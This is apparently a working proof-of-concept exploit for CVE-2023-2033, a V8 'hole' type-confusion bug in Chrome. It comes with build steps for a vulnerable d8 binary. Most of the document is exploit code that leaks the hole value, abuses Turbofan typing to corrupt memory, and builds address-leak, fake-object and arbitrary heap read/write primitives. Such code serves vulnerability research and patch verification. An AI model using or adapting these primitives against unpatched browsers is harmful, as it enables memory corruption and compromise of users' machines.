//CVE-2023-2033
//author: @mistymntncop
//based on the ITW exploit
//dedicated to Chrome (the band NOT the browser) and @_clem1 for finding the ITW exploit.
//
//Uses "new" (patched) typer bypass for exploiting "The Hole"
//
// 1) https://bugs.chromium.org/p/chromium/issues/detail?id=1445008
//    "Currently the_hole is an Oddball object (like 'null', 'undefined', 'true', 'false') and therefore looks like a
//     valid JSObject. For that reason, operations like ToNumber are currently possible for the_hole (and result in NaN).
//     The fact that this is possible by accident has led to issues with Turbofan's Typer, allowing an attacker to cause
//     mistyping in the JIT and subsequently memory corruption."
//
// 2) https://chromium-review.googlesource.com/c/v8/v8/+/4454339/6/src/compiler/js-call-reducer.cc#1167
//    [compiler] add more typer hardening
//  
//
//leak_hole() copied from ITW exploit (https://bugs.chromium.org/p/chromium/issues/detail?id=1432210)
//
//
// Build d8 using:
// a) Run once
//    git checkout f7a3499f6d7e50b227a17d2bbd96e4b59a261d3c
//    gclient sync --with_branch_heads //pass -f flag to force
//    gn gen ./out/x64.debug
//    gn gen ./out/x64.release
//
// b) 
//    Debug Build:
//    If you run into this error: "FAILED: torque.exe torque.exe.pdb"
//    please apply the patch "fix_torque_build_error.patch" with:
//    git apply "C:\path\to\patch\fix_torque_build_error.patch"
//  
//    This patch has nothing to do with the vuln - it only fixes the torque build error.
//    See: https://bugs.chromium.org/p/v8/issues/detail?id=14015
//
//    ninja -C ./out/x64.debug d8
//
//    Release Build:
//    ninja -C ./out/x64.release d8
//
//"C:\v8\v8\out\x64.release\d8.exe" --allow-natives-syntax exploit.js

const FIXED_ARRAY_HEADER_SIZE = 8n;

var arr_buf = new ArrayBuffer(8);
var f64_arr = new Float64Array(arr_buf);
var b64_arr = new BigInt64Array(arr_buf);

function ftoi(f) {
    f64_arr[0] = f;
    return b64_arr[0];
}

function itof(i) {
    b64_arr[0] = i;
    return f64_arr[0];
}

function smi(i) {
    return i << 1n;
}

function gc_minor() { //scavenge
    for(let i = 0; i < 1000; i++) {
        new ArrayBuffer(0x10000);
    }
}

function gc_major() { //mark-sweep
    new ArrayBuffer(0x7fe00000);
}

var h0le = [0];
function leak_hole() {
    function rGlobal() {
        h0le[0] = stack;
    }
    Error.captureStackTrace(globalThis);
    Error.prepareStackTrace = function() {
        Reflect.deleteProperty(Error, 'prepareStackTrace');
        Reflect.deleteProperty(globalThis, 'stack');
        Reflect.defineProperty(
            globalThis, 'stack',
            {configurable: false, writable: true, enumerable: true, value: 1});
        stack = undefined;
        for (let i = 0; i < 100000; i++) {
            rGlobal();
        }
        //%PrepareFunctionForOptimization(rGlobal);
        //rGlobal();
        //%OptimizeFunctionOnNextCall(rGlobal);
        //rGlobal();
        
        return undefined;
    };
    Reflect.defineProperty(
        globalThis, 'stack',
        {configurable: true, writable: true, enumerable: true, value: undefined});
    //%DebugPrint(Reflect.getOwnPropertyDescriptor(globalThis, "stack"));
    delete globalThis.stack;
    
    rGlobal();
    return h0le[0];
}

const the = { hole: leak_hole() };
var large_arr = new Array(0x10000);
large_arr.fill(itof(0xDEADBEE0n)); //change array type to HOLEY_DOUBLE_ELEMENTS_MAP
var fake_arr = null;
var fake_arr_addr = null;
var fake_arr_elements_addr = null;

var packed_dbl_map = null;
var packed_dbl_props = null;

var packed_map = null;
var packed_props = null;

function leak_stuff(b) {
    if(b) {
        let index = Number(b ? the.hole : -1);
        index |= 0;
        index += 1;
       
        let arr1 = [1.1, 2.2, 3.3, 4.4];
        let arr2 = [0x1337, large_arr];
        
        let packed_double_map_and_props = arr1.at(index*4);
        let packed_double_elements_and_len = arr1.at(index*5);
        
        let packed_map_and_props = arr1.at(index*8);
        let packed_elements_and_len = arr1.at(index*9);
        
        let fixed_arr_map = arr1.at(index*6);
        
        let large_arr_addr = arr1.at(index*7);

        return [
            packed_double_map_and_props, packed_double_elements_and_len,
            packed_map_and_props, packed_elements_and_len, 
            fixed_arr_map, large_arr_addr, 
            arr1, arr2
        ];
    }
    return 0;
}

function weak_fake_obj(b, addr=1.1) {
    if(b) {
        let index = Number(b ? the.hole : -1);
        index |= 0;
        index += 1;
       
        let arr1 = [0x1337, {}]
        let arr2 = [addr, 2.2, 3.3, 4.4];
        
        let fake_obj = arr1.at(index*8);
        
        return [
            fake_obj,
            arr1, arr2
        ];
    }
    return 0;
}

function fake_obj(addr) {
    large_arr[0] = itof(packed_map | (packed_dbl_props << 32n));
    large_arr[1] = itof(fake_arr_elements_addr | (smi(1n) << 32n));
    large_arr[3] = itof(addr | 1n);
    
    let result = fake_arr[0];
    
    large_arr[1] = itof(0n | (smi(0n) << 32n)); 
    
    return result;
}


function addr_of(obj) {
    large_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
    large_arr[1] = itof(fake_arr_elements_addr | (smi(1n) << 32n));
    
    fake_arr[0] = obj;
    let result = ftoi(large_arr[3]) & 0xFFFFFFFFn;
    
    large_arr[1] = itof(0n | (smi(0n) << 32n)); 
    
    return result;
}

function v8_read64(addr) {
    addr -= FIXED_ARRAY_HEADER_SIZE;
    
    large_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
    large_arr[1] = itof((addr | 1n) | (smi(1n) << 32n));
    
    let result = ftoi(fake_arr[0]);
    
    large_arr[1] = itof(0n | (smi(0n) << 32n)); 

    return result;    
}

function v8_write64(addr, val) {
    addr -= FIXED_ARRAY_HEADER_SIZE;
    
    large_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
    large_arr[1] = itof((addr | 1n) | (smi(1n) << 32n));
    
    fake_arr[0] = itof(val);
    
    large_arr[1] = itof(0n | (smi(0n) << 32n));   
}


function install_primitives() {
    //%PrepareFunctionForOptimization(weak_fake_obj);
    //weak_fake_obj(false, 1.1);
    //weak_fake_obj(true, 1.1);
    //%OptimizeFunctionOnNextCall(weak_fake_obj);
    //weak_fake_obj(true, 1.1);
    //
    //%PrepareFunctionForOptimization(leak_stuff);
    //leak_stuff(false);
    //leak_stuff(true);
    //%OptimizeFunctionOnNextCall(leak_stuff);
    
    for(let i = 0; i < 10; i++) {
        weak_fake_obj(true, 1.1);
    }
    for(let i = 0; i < 4000; i++) {
        weak_fake_obj(false, 1.1);
    }

    for(let i = 0; i < 10; i++) {
        leak_stuff(true);
    }
    for(let i = 0; i < 11000; i++) {
        leak_stuff(false);
    }
    
    gc_minor();
    gc_major();
    
    let leaks = leak_stuff(true);
    %DebugPrint(leaks);
        
    let packed_double_map_and_props = ftoi(leaks[0]);
    let packed_double_elements_and_len = ftoi(leaks[1]);
    packed_dbl_map = packed_double_map_and_props & 0xFFFFFFFFn;
    packed_dbl_props = packed_double_map_and_props >> 32n;
    let packed_dbl_elements = packed_double_elements_and_len & 0xFFFFFFFFn;
    
    let packed_map_and_props = ftoi(leaks[2]);
    let packed_elements_and_len = ftoi(leaks[3]);
    packed_map = packed_map_and_props & 0xFFFFFFFFn;
    packed_props = packed_map_and_props >> 32n;
    let packed_elements = packed_elements_and_len & 0xFFFFFFFFn;
    
    let fixed_arr_map = ftoi(leaks[4]) & 0xFFFFFFFFn;
    
    let large_arr_addr = ftoi(leaks[5]) >> 32n;
    
    let dbl_arr = leaks[6];
    dbl_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
    dbl_arr[1] = itof(((large_arr_addr + 8n) - FIXED_ARRAY_HEADER_SIZE) | (smi(1n) << 32n));
    
    let temp_fake_arr_addr = (packed_dbl_elements + FIXED_ARRAY_HEADER_SIZE)|1n;
    
    %DebugPrint(leaks[6]);
    %DebugPrint(leaks[7]);
    //%DebugPrint(large_arr);
    
    print("packed_dbl_map = " + packed_dbl_map.toString(16));
    print("packed_dbl_props = " + packed_dbl_props.toString(16));
    print("packed_dbl_elements = " + packed_dbl_elements.toString(16));
    print("packed_map = " + packed_map.toString(16));
    print("packed_props = " + packed_props.toString(16));
    print("packed_elements = " + packed_elements.toString(16));
    print("fixed_arr_map = " + fixed_arr_map.toString(16));
    print("large_arr = " + large_arr_addr.toString(16));
    
    
    print("addr = " + ftoi(leaks[0]).toString(16));
    print("addr = " + ftoi(leaks[1]).toString(16));
    
    print("addr = " + ftoi(leaks[2]).toString(16));
    print("addr = " + ftoi(leaks[3]).toString(16));
    
    print("addr = " + ftoi(leaks[4]).toString(16));
    print("addr = " + ftoi(leaks[5]).toString(16));


    let temp_fake_arr = weak_fake_obj(true, itof(temp_fake_arr_addr));
    let large_arr_elements_addr = ftoi(temp_fake_arr[0]) & 0xFFFFFFFFn;
    fake_arr_addr = large_arr_elements_addr + FIXED_ARRAY_HEADER_SIZE;
    fake_arr_elements_addr = fake_arr_addr + 16n;
    
    large_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
    large_arr[1] = itof(fake_arr_elements_addr | (smi(0n) << 32n));
    large_arr[2] = itof(fixed_arr_map | (smi(0n) << 32n));

    fake_arr = weak_fake_obj(true, itof(fake_arr_addr))[0];

    temp_fake_arr = null;
}
function pwn() {
    install_primitives();

    let obj = {};
    let obj_addr = addr_of(obj);
    %DebugPrint(obj);
    let obj2 = fake_obj(obj_addr);
    %DebugPrint(obj2);
    print("obj_addr = " + obj_addr.toString(16));

    let map = v8_read64(obj_addr) & 0xFFFFFFFFn;
    print("map = " + map.toString(16));
    
}
pwn();
